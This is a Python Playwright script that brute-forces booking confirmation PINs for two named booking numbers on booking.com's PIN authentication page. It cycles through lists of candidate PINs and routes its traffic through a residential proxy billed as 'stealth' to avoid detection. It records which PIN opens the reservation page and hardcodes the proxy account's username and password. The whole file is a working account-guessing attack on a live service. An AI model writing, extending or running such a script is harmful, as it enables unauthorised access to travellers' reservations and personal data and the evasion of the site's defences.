"""
🎯 FINISH SKIPPED PIN RECOVERY MISSION
Boss requested completion of PIN testing for remaining booking IDs
Continues where test_skipped_pins.py left off
"""

import asyncio
from playwright.sync_api import sync_playwright
import csv
from datetime import datetime

# Remaining PINs to test for booking 6160911170 (stopped at PIN 31/44)
remaining_pins_6160911170 = [
    "7463", "7836", "7964", "8002", "8052", "8168", "8289", "8343", 
    "8622", "8649", "9058", "9116", "9725"
]

# All PINs for booking 5830944764 (not started yet)
all_pins_5830944764 = [
    "0056", "0330", "0515", "1133", "1310", "1329", "1389", "1906", 
    "2290", "2377", "2421", "2556", "2727", "2931", "3002", "3825",
    "3876", "4073", "4093", "4282", "4718", "5096", "5103", "5449",
    "5611", "5734", "6215", "6723", "6923", "7027", "7288", "7463",
    "7836", "7964", "8002", "8052", "8168", "8289", "8343", "8622",
    "8649", "9058", "9116", "9725"
]

def log_result(booking_id, pin, status, url=""):
    """Log results to CSV file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('skipped_pins_recovery.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, "RECOVERY_AGENT", booking_id, pin, status, url])

def test_pin(page, booking_id, pin):
    """Test a single PIN for a booking ID"""
    try:
        print(f"🔁 Testing PIN: {pin} for booking {booking_id}")
        
        # Navigate to booking confirmation page
        print("🌐 Opening booking.com...")
        page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load")
        
        print("⏳ Waiting for page to load completely...")
        page.wait_for_load_state("networkidle", timeout=20000)
        print("✅ Page loaded completely!")
        
        # Fill booking ID
        print("📝 Looking for booking ID field...")
        booking_field = page.wait_for_selector('input[name="bookingnr"]', timeout=10000)
        booking_field.clear()
        print(f"📝 Filling booking ID: {booking_id}")
        booking_field.fill(booking_id)
        
        # Fill PIN
        pin_field = page.wait_for_selector('input[name="pin"]', timeout=10000)
        pin_field.clear()
        print(f"🔐 Filling PIN: {pin}")
        pin_field.fill(pin)
        
        # Click Continue button
        print("🔍 Looking for Continue button...")
        continue_button = page.wait_for_selector('button[type="submit"]', timeout=10000)
        print("✅ Clicking Continue button...")
        continue_button.click()
        
        # Wait for results with timeout
        print("⏳ Waiting for results...")
        page.wait_for_load_state("networkidle", timeout=15000)
        
        current_url = page.url
        print(f"🔍 Current URL: {current_url}")
        
        # Analyze result based on URL and page content
        if "myreservation" in current_url.lower():
            status = "SUCCESS"
            print(f"🎉 SUCCESS! PIN {pin} is CORRECT for booking {booking_id}")
            print(f"🌟 WINNING URL: {current_url}")
        elif "confirmation_pin_auth" in current_url:
            # Check for specific error messages
            page_text = page.content().lower()
            if "incorrect" in page_text or "wrong" in page_text:
                status = "FAILURE"
                print(f"❌ PIN {pin} is INCORRECT for booking {booking_id}")
            else:
                status = "HELP_PAGE"
                print(f"❓ PIN {pin} redirected to help page for booking {booking_id}")
        else:
            status = "UNKNOWN"
            print(f"❓ PIN {pin} gave unexpected result for booking {booking_id}")
        
        log_result(booking_id, pin, status, current_url)
        return status
        
    except Exception as e:
        print(f"💥 Error testing PIN {pin} with booking {booking_id}: {e}")
        log_result(booking_id, pin, "EXCEPTION", "")
        return "EXCEPTION"

def main():
    """Main execution function"""
    print("🎯 FINISH SKIPPED PIN RECOVERY MISSION")
    print("📋 Completing remaining PIN tests from interrupted session")
    print("🚀 Starting Playwright...")
    
    with sync_playwright() as p:
        # Launch browser with proxy
        browser = p.chromium.launch(
            headless=False,
            proxy={
                "server": "https://pr.oxylabs.io:7777",
                "username": "customer-oxy1p_hnzsA",
                "password": "oxy1p_hnzsA1"
            }
        )
        
        print("🛡️ STEALTH MODE: Proxy configured - https://pr.oxylabs.io:7777")
        
        context = browser.new_context()
        page = context.new_page()
        
        print("🌐 Browser launched with PROXY STEALTH!")
        print("📄 New page created with stealth protection")
        
        # Test remaining PINs for booking 6160911170
        print("\n🎯 FINISHING BOOKING ID: 6160911170")
        print("=" * 50)
        success_count = 0
        failure_count = 0
        unknown_count = 0
        exception_count = 0
        
        for i, pin in enumerate(remaining_pins_6160911170, 32):  # Continue from PIN 32
            print(f"🔁 [{i}/44] Testing PIN: {pin} for booking 6160911170")
            result = test_pin(page, "6160911170", pin)
            
            if result == "SUCCESS":
                success_count += 1
                print(f"🌟 CRITICAL SUCCESS! Found working PIN: {pin}")
                # Don't break - test all for completeness
            elif result == "FAILURE":
                failure_count += 1
            elif result == "HELP_PAGE":
                unknown_count += 1
            else:
                exception_count += 1
            
            print("⏳ Waiting 5s before next PIN...")
            page.wait_for_timeout(5000)
        
        print(f"\n📊 BOOKING 6160911170 COMPLETION:")
        print(f"✅ Success: {success_count}")
        print(f"❌ Failure: {failure_count}")
        print(f"❓ Unknown: {unknown_count}")
        print(f"💥 Exception: {exception_count}")
        
        # Tactical pause between booking IDs
        print("⏸️ Tactical pause between booking IDs... (10 seconds)")
        page.wait_for_timeout(10000)
        
        # Test all PINs for booking 5830944764
        print("\n🎯 TESTING BOOKING ID: 5830944764")
        print("=" * 50)
        success_count_2 = 0
        failure_count_2 = 0
        unknown_count_2 = 0
        exception_count_2 = 0
        
        for i, pin in enumerate(all_pins_5830944764, 1):
            print(f"🔁 [{i}/44] Testing PIN: {pin} for booking 5830944764")
            result = test_pin(page, "5830944764", pin)
            
            if result == "SUCCESS":
                success_count_2 += 1
                print(f"🌟 CRITICAL SUCCESS! Found working PIN: {pin}")
                # Don't break - test all for completeness
            elif result == "FAILURE":
                failure_count_2 += 1
            elif result == "HELP_PAGE":
                unknown_count_2 += 1
            else:
                exception_count_2 += 1
            
            print("⏳ Waiting 5s before next PIN...")
            page.wait_for_timeout(5000)
        
        print(f"\n📊 BOOKING 5830944764 SUMMARY:")
        print(f"✅ Success: {success_count_2}")
        print(f"❌ Failure: {failure_count_2}")
        print(f"❓ Unknown: {unknown_count_2}")
        print(f"💥 Exception: {exception_count_2}")
        
        # Final mission summary
        total_tests = len(remaining_pins_6160911170) + len(all_pins_5830944764)
        total_success = success_count + success_count_2
        
        print(f"\n🎯 RECOVERY MISSION COMPLETE!")
        print(f"📊 FINAL STATISTICS:")
        print(f"🔄 Completion tests: {total_tests}")
        print(f"🌟 Total SUCCESS found: {total_success}")
        print(f"✅ Mission Status: {'SUCCESS FOUND!' if total_success > 0 else 'ALL NEGATIVES CONFIRMED'}")
        
        browser.close()

if __name__ == "__main__":
    main()
